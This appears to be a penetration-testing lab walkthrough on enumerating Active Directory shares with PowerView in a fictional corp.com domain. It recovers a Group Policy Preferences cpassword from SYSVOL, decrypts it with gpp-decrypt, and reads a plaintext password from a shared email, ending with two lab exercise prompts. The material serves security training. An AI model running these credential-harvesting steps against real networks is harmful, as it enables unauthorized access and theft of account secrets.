# Enumerating Domain Shares

Domain Share Query
>``` shell
>PS C:\Tools> Find-DomainShare
>
># ========== Expected Result ==========
>Name           Type Remark                 ComputerName
>----           ---- ------                 ------------
>ADMIN$   2147483648 Remote Admin           DC1.corp.com
>C$       2147483648 Default share          DC1.corp.com
>IPC$     2147483651 Remote IPC             DC1.corp.com
>NETLOGON          0 Logon server share     DC1.corp.com
>SYSVOL            0 Logon server share     DC1.corp.com
>ADMIN$   2147483648 Remote Admin           web04.corp.com
>backup            0                        web04.corp.com
>C$       2147483648 Default share          web04.corp.com
>IPC$     2147483651 Remote IPC             web04.corp.com
>ADMIN$   2147483648 Remote Admin           FILES04.corp.com
>C                 0                        FILES04.corp.com
>C$       2147483648 Default share          FILES04.corp.com
>docshare          0 Documentation purposes FILES04.corp.com
>IPC$     2147483651 Remote IPC             FILES04.corp.com
>Tools             0                        FILES04.corp.com
>Users             0                        FILES04.corp.com
>Windows           0                        FILES04.corp.com
>ADMIN$   2147483648 Remote Admin           client74.corp.com
>C$       2147483648 Default share          client74.corp.com
>IPC$     2147483651 Remote IPC             client74.corp.com
>ADMIN$   2147483648 Remote Admin           client75.corp.com
>C$       2147483648 Default share          client75.corp.com
>IPC$     2147483651 Remote IPC             client75.corp.com
>sharing           0                        client75.corp.com
># =====================================
>```

Listing contents of the SYSVOL share
>``` shell
>PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\
>
># ========== Expected Result ==========
>    Directory: \\dc1.corp.com\sysvol\corp.com
>
>Mode                 LastWriteTime         Length Name
>----                 -------------         ------ ----
>d-----         9/21/2022   1:11 AM                Policies
>d-----          9/2/2022   4:08 PM                scripts
># =====================================
>```

Listing contents of the "SYSVOL\policies share"
>``` shell
>PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies\
>
># ========== Expected Result ==========
>    Directory: \\dc1.corp.com\sysvol\corp.com\Policies
>
>Mode                 LastWriteTime         Length Name
>----                 -------------         ------ ----
>d-----         9/21/2022   1:13 AM                oldpolicy
>d-----          9/2/2022   4:08 PM                {31B2F340-016D-11D2-945F-00C04FB984F9}
>d-----          9/2/2022   4:08 PM                {6AC1786C-016F-11D2-945F-00C04fB984F9}
># =====================================
>```

Checking contents of old-policy-backup.xml file
>``` shell
>PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
>
># ========== Expected Result ==========
><?xml version="1.0" encoding="utf-8"?>
><Groups   clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
>  <User   clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
>          name="Administrator (built-in)"
>          image="2"
>          changed="2012-05-03 11:45:20"
>          uid="{253F4D90-150A-4EFB-BCC8-6E894A9105F7}">
>    <Properties
>          action="U"
>          newName=""
>          fullName="admin"
>          description="Change local admin"
>          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
>          changeLogon="0"
>          noChange="0"
>          neverExpires="0"
>          acctDisabled="0"
>          userName="Administrator (built-in)"
>          expires="2016-02-10" />
>  </User>
></Groups>
># =====================================
>```

Using gpp-decrypt to decrypt the password
>``` shell
>kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
>
># ========== Expected Result ==========
>P@$$w0rd
># =====================================
>```

Listing the contents of docsare
>``` shell
>PS C:\Tools> ls \\FILES04\docshare
>
># ========== Expected Result ==========
>    Directory: \\FILES04\docshare
>
>Mode                 LastWriteTime         Length Name
>----                 -------------         ------ ----
>d-----         9/21/2022   2:02 AM                docs
># =====================================
>```

Listing the contents of do-not-share
>``` shell
>PS C:\Tools> ls \\FILES04\docshare\docs\do-not-share
>
># ========== Expected Result ==========
>    Directory: \\FILES04\docshare\docs\do-not-share
>
>Mode                 LastWriteTime         Length Name
>----                 -------------         ------ ----
>-a----         9/21/2022   2:02 AM           1142 start-email.txt
># =====================================
>```

Checking the "start-email.txt" file
>``` shell
>PS C:\Tools> cat \\FILES04\docshare\docs\do-not-share\start-email.txt
>
># ========== Expected Result ==========
>Hi Jeff,
>
>We are excited to have you on the team here in Corp. As Pete mentioned, we have been without a system administrator
>since Dennis left, and we are very happy to have you on board.
>
>Pete mentioned that you had some issues logging in to your Corp account, so I'm sending this email to you on your personal address.
>
>The username I'm sure you already know, but here you have the brand new auto generated password as well: HenchmanPutridBonbon11
>
>As you may be aware, we are taking security more seriously now after the previous breach, so please change the password at first login.
>
>Best Regards
>Stephanie
>
>...............
>
>Hey Stephanie,
>
>Thank you for the warm welcome. I heard about the previous breach and that Dennis left the company.
>
>Fortunately he gave me a great deal of documentation to go through, although in paper format. I'm in the
>process of digitalizing the documentation so we can all share the knowledge. For now, you can find it in
>the shared folder on the file server.
>
>Thank you for reminding me to change the password, I will do so at the earliest convenience.
>
>Best regards
>Jeff
># =====================================
>```

Lab 1 - Start VM Group 1 and log in to CLIENT75 as stephanie. Repeat the enumeration steps outlined in this section and view the information in the accessible shares. What is the hostname for the server sharing the SYSVOL folder in the corp.com domain?
>``` shell
>
>```
>

Lab 2 - Start VM Group 2 and log in to CLIENT75 as stephanie. Use PowerView to locate the shares in the modified corp.com domain and enumerate them to obtain the flag.
>``` shell
>
>```
>
